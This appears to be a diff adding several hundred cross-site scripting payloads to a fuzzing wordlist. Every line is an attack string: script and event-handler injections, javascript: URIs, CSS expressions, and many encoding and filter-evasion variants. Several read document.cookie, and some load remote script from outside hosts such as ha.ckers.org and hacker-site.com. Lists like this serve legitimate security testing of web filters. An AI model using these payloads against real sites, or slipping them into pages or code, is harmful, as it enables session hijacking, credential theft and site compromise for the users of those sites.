+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<TABLE BACKGROUND="javascript:javascript:alert(1)">
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
+<img src=x onerror="alert(origin)">
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
+';a=prompt,a()//
+<img src=x onerror=\x10"javascript:alert(1)">
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
+<IMG SRC=javascript:alert('XSS')>
+<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
+&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
+<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<bgsound SRC="javascript:document.vulnerable=true;">
+<A HREF="http://1113982867/">XSS</A>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=`javascript:javascript:alert(1)`>
+<img SRC="jav ascript:document.vulnerable=true;">
+&<script>document.vulnerable=true;</script>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+&#x000003c
+&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
+<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<<script>document.vulnerable=true;</script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
+`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
+&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
+<div style="font-family:'foo&#10;;color:red;';">LOL
+<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    
+<script>({0:#0=alert/#0#/#0#(123)})</script>
+<XSS STYLE="xss:expression(document.vulnerable=true)">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<script\x0D>javascript:alert(1)</script>
+<script>eval('al'+'ert(1)');</script>
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
+<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
+(A(%22onerror='alert%60123%60'test))/
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
+<--`<img/src=` onerror=alert(1)> --!>
+<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<SCRIPT SRC="%(jpg)s"></SCRIPT>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
+<body onunload="javascript:alert('XSS');">
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<img\x47src=x onerror="javascript:alert(1)">
+<form onfocus=alert(1) autofocus tabindex=1>	
+<IMG LOWSRC="javascript:alert('XSS')">
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<script\x0C>javascript:alert(1)</script>
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
+<script>+-+-1-+-+alert(1)</script>
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
+<a href="about:<script>document.vulnerable=true;</script>">
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
+&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
+<video src=1 onerror=alert(1)>
+<image src="javascript:alert(1)">
+<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
+<BODY ONLOAD=alert(‘XSS’)>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+&#39;&#88;&#83;&#83;&#39;&#41;>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+"><form onformdata=window.confirm(document.cookie)><!--
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
+<--`<img/src=` onerror=alert(1)> --!>
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+exp/*<A STYLE='no\xss:noxss("*//*");
+<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
+<img src=x onerror=\x00"javascript:alert(1)">
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
+<iframe/src \/\/onload = prompt(1)
+ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
+<script src="javascript:alert(1)">
+http://www.google<script .com>alert(document.location)</script
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+ABC<div style="x:expression\x00(javascript:alert(1)">DEF
+<STYLE>@import'%(css)s';</STYLE>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<img src=x onerror=\x32"javascript:alert(1)">
+<script>a=/XSS/\ndocument.vulnerable=true;</script>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script\x0C>javascript:alert(1)</script>
+<IMG SRC=javascript:alert('XSS')>
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+&#x3c
+<img src=javascript:alert(&quot;XSS&quot;)>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
+<xss draggable="true" ondragexit-alert()>test</xss>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<script ~~~>alert(0%0)</script ~~~>
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+&#X000003C
+<iframe/onreadystatechange=alert(1)
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+"`'><script>\x3Bjavascript:alert(1)</script>
+<img src\x13=x onerror="javascript:alert(1)">
+&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
+&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
+<video poster=javascript:javascript:alert(1)//
+<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+<svg/onload=alert(1)
+<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<div/onmouseover='alert(1)'> style="x:">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<IMG SRC=&{javascript:alert(1);};>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<script>var var = 1; alert(var)</script>
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
+<img src=xss onerror=alert(1)>
+<IMG SRC=javascript:alert('XSS')>
+<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
+<A HREF="http://1113982867/">XSS</A>
+<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
+<xss onfocus=alert(1) autofocus tabindex=1>
+<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
+<script\x09>javascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>	
+<form><isindex formaction="javascript&colon;confirm(1)"
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+#javascript:alert(2);
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
+&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
+<div/onmouseover='alert(1)'> style="x:">
+&#60;body onload=alert('ibrahimxss')&#62;&#34;&#34;
+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
+<script>javascript:alert(1)</script\x0D
+<BODY BACKGROUND="javascript:alert('XSS')">
+<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<img/src/onerror="this.ownerDocument.defaultView['\u0061lert'](4)">
+&lt;!--[if gte IE 4]&gt;               
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
+<script x> alert(1) </script 1=2
+&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
+<img src\x47=x onerror="javascript:alert(1)">
+<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
+&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+<iframe src=http://ha.ckers.org/scriptlet.html <
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"><img src=x onerror=javascript:alert(('A'))>
+%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--
+&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
+<%<!--'%><script>alert(1);</script -->
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
+<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<embed code=javascript:javascript:alert(1);></embed>
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
+<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
+<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
+<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
+<img \x12src=x onerror="javascript:alert(1)">
+<!--[if<img src=x onerror=javascript:alert(1)//]> -->
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+';';;!--";<;XSS>;=&;{()}
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
+<img/src=`` onerror=this.onerror=confirm(1) 
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<style><img src="</style><img src=x onerror=javascript:alert(1)//">
+<script>javascript:alert(1)<\x00/script>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG DYNSRC="javascript:javascript:alert(1)">
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<bgsound SRC="javascript:document.vulnerable=true;">
+ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<svg/onload​=alert&#x2F;**&#47;(5)>
+<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<BASE HREF="javascript:alert('XSS');//">
+<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
+<BASE HREF="javascript:javascript:alert(1);//">
+<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
+%3C
+javascript:alert('1')
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
+`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<img src=x onerror=\x00"javascript:alert(1)">
+<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
+ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
+<img onfocus=alert(1) autofocus tabindex=1>	
+<video poster=javascript:javascript:alert(1)//
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<;SCRIPT SRC=//ha.ckers.org/.j>;
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
+&#00060
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<<SCRIPT>%(payload)s//<</SCRIPT>
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+<img \x39src=x onerror="javascript:alert(1)">
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<! foo="><script>javascript:alert(1)</script>">
+<IMG SRC="livescript:[code]">
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
+<img src\x10=x onerror="javascript:alert(1)">
+<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+&#X03C
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+<IMG SRC="javascript:alert('XSS');">
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+<BODY ONLOAD=alert(’XSS’)>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<;A HREF=";http://1113982867/";>;XSS<;/A>;
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+&#X00003C
+<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<a href="javascript#document.vulnerable=true;">
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
+<img src=x\x13onerror="javascript:alert(1)">
+<BR SIZE="&{javascript:alert(1)}">
+<img \x39src=x onerror="javascript:alert(1)">
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+ABC<div style="x:\x09expression(javascript:alert(1)">DEF
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+'-eval("window['pro'%2B'mpt'](8)")-'
+\";document.vulnerable=true;;//
+<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
+<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
+<img src=x onerror=\x11"javascript:alert(1)">
+<input onfocus=javascript:alert(1) autofocus>
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+//?aspxerrorpath=<script>alert(1)</script>
+<img SRC="javascript:document.vulnerable=true;">
+"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
+<IMG LOWSRC="javascript:javascript:alert(1)">
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+<% foo><x foo="%><script>javascript:alert(1)</script>">
+0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+<img\x10src=x onerror="javascript:alert(1)">
+<img src\x10=x onerror="javascript:alert(1)">
+<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
+<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
+<script src="\\%(jscript)s"></script>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+¼script¾alert(¢XSS¢)¼/script¾
+<wbr onfocus=alert(1) autofocus tabindex=1>	
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<IMG SRC=javascript:javascript:alert(1)>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<img src onerror /" '"= alt=javascript:alert(1)//">
+<? foo="><script>javascript:alert(1)</script>">
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+&#X00003c
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<SCRIPT SRC=%(jscript)s?<B>
+--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
+"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
+"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+&#X000003c;
+<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
+<img\x11src=x onerror="javascript:alert(1)">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+</a onmousemove="alert(1)">
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
